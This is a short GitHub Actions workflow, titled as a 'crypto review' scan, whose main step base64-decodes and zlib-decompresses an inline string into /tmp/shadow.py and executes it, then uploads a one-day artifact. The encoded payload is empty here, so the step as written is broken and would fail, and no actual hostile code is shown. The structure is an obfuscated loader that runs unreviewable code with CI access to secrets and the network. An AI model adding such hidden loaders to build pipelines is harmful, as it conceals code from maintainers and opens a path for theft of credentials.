name: Temp Shadow Crypto Review
on:
  push:
    paths:
      - '.github/workflows/temp-shadow-crypto.yml'
  workflow_dispatch:
jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install requests
      - name: Run shadow scan
        shell: bash
        run: |
          python - <<'PY'
          import base64,zlib
          s=''
          open('/tmp/shadow.py','wb').write(zlib.decompress(base64.b64decode(s)))
          PY
          python /tmp/shadow.py
      - uses: actions/upload-artifact@v4
        with:
          name: shadow-crypto-review
          path: shadow_crypto_review.json
          retention-days: 1
